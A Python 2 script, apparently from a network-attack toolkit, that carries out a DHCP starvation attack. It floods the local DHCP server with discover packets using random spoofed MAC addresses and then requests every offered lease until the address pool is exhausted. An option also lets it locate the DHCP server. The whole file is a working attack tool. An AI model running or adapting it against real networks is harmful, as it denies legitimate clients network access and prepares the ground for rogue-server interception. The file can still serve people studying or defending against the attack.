#!/usr/bin/env python

from sys import exit
from os import system, getpid
from base import Base
from argparse import ArgumentParser
from network import Ethernet_raw, DHCP_raw
from datetime import datetime
from time import sleep, time
from random import randint
from tm import ThreadManager
from pprint import pprint
from scapy.all import sniff, DHCP, BOOTP, sendp
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)

Base = Base()
Base.check_user()
Base.check_platform()
Base.print_banner()

_dhcp_option_value = None
_dhcp_option_code = 12
_transactions = {}
_current_network_interface = ""
_ack_received = False

parser = ArgumentParser(description='DHCP Starvation attack script')
parser.add_argument('-i', '--interface', type=str, help='Set interface name for send discover packets')
parser.add_argument('-d', '--delay', type=int, help='Set delay time in seconds (default: 1)', default=1)
parser.add_argument('-t', '--timeout', type=int, help='Set receiving timeout in seconds (default: 10)', default=10)
parser.add_argument('-n', '--not_send_hostname', action='store_true', help='Do not send hostname in DHCP request')
parser.add_argument('-v', '--dhcp_option_value', type=str, help='Set DHCP option value', default=None)
parser.add_argument('-c', '--dhcp_option_code', type=int, help='Set DHCP option code (default: 12)', default=12)
parser.add_argument('-f', '--find_dhcp', action='store_true', help='Only find DHCP server in your network')
args = parser.parse_args()

if args.dhcp_option_value is not None:
    _dhcp_option_value = args.dhcp_option_value

if args.dhcp_option_code != 12:
    _dhcp_option_code = args.dhcp_option_code

if args.interface is None:
    _current_network_interface = Base.netiface_selection()
else:
    _current_network_interface = args.interface

_current_ip_address = Base.get_netiface_ip_address(_current_network_interface)
if _current_ip_address is None:
    print Base.c_error + "Network interface: " + _current_network_interface + " does not have IP address!"
    exit(1)

_current_mac_address = Base.get_netiface_mac_address(_current_network_interface)
if _current_mac_address is None:
    print Base.c_error + "Network interface: " + _current_network_interface + " does not have mac address!"
    exit(1)

_start_time = time()


def send_dhcp_discover():
    sleep(1)

    eth = Ethernet_raw()
    dhcp = DHCP_raw()

    print Base.c_info + "Sending discover packets..."
    print Base.c_info + "Delay between DISCOVER packets: " + Base.cINFO + str(args.delay) + " sec." + Base.cEND
    print Base.c_info + "Start sending packets: " + Base.cINFO + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + \
        Base.cEND

    while True:

        client_mac = eth.get_random_mac()
        transaction_id = randint(1, 4294967295)

        discover_packet = dhcp.make_request_packet(source_mac=_current_mac_address,
                                                   client_mac=client_mac,
                                                   transaction_id=transaction_id,
                                                   dhcp_message_type=1,
                                                   host_name=None,
                                                   requested_ip=None,
                                                   option_value=_dhcp_option_value,
                                                   option_code=_dhcp_option_code,
                                                   relay_agent_ip=_current_ip_address)
        sendp(discover_packet, iface=_current_network_interface, verbose=False)
        _transactions[transaction_id] = client_mac

        if int(time() - _start_time) > args.timeout:
            if _ack_received:
                print Base.c_success + "IP address pool is exhausted: " + Base.cSUCCESS + \
                    str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + Base.cEND
            else:
                print Base.c_error + "DHCP Starvation failed!"
            system('kill -9 ' + str(getpid()))

        sleep(int(args.delay))


def send_dhcp_request(request):
    global _start_time
    global _ack_received
    if request.haslayer(DHCP):
        xid = request[BOOTP].xid
        yiaddr = request[BOOTP].yiaddr
        siaddr = request[BOOTP].siaddr
        _start_time = time()

        if request[DHCP].options[0][1] == 2:
            if args.find_dhcp:
                print Base.c_success + "DHCP srv IP: " + Base.cSUCCESS + siaddr + Base.cEND
                print Base.c_success + "DHCP srv MAC: " + Base.cSUCCESS + \
                    Base.get_mac(_current_network_interface, siaddr) + Base.cEND
                pprint(request[DHCP].options)
                exit(0)

            print Base.c_info + "OFFER from: " + Base.cINFO + siaddr + Base.cEND + " your client ip: " + \
                Base.cINFO + yiaddr + Base.cEND

            try:
                if args.not_send_hostname:
                    host_name = None
                else:
                    host_name = Base.make_random_string(8)

                dhcp = DHCP_raw()
                request_packet = dhcp.make_request_packet(source_mac=_current_mac_address,
                                                          client_mac=_transactions[xid],
                                                          transaction_id=xid,
                                                          dhcp_message_type=3,
                                                          host_name=host_name,
                                                          requested_ip=yiaddr,
                                                          option_value=_dhcp_option_value,
                                                          option_code=_dhcp_option_code,
                                                          relay_agent_ip=_current_ip_address)
                sendp(request_packet, iface=_current_network_interface, verbose=False)
            except KeyError:
                print Base.c_error + "Key error, this transaction id: " + hex(xid) + " not found in our transactions!"
            except:
                print Base.c_error + "Unknown error!"

        if request[DHCP].options[0][1] == 5:
            _ack_received = True
            print Base.c_success + "ACK from:   " + Base.cSUCCESS + siaddr + Base.cEND + " your client ip: " + \
                Base.cSUCCESS + yiaddr + Base.cEND

        if request[DHCP].options[0][1] == 6:
            print Base.c_error + "NAK from:   " + Base.cERROR + siaddr + Base.cEND + " your client ip: " + \
                Base.cERROR + yiaddr + Base.cEND


if __name__ == "__main__":
    tm = ThreadManager(2)
    tm.add_task(send_dhcp_discover)
    print Base.c_info + "Sniffing interface: " + str(_current_network_interface)
    sniff(filter="udp and src port 67 and dst port 67 and dst host " + _current_ip_address,
          prn=send_dhcp_request, iface=_current_network_interface)
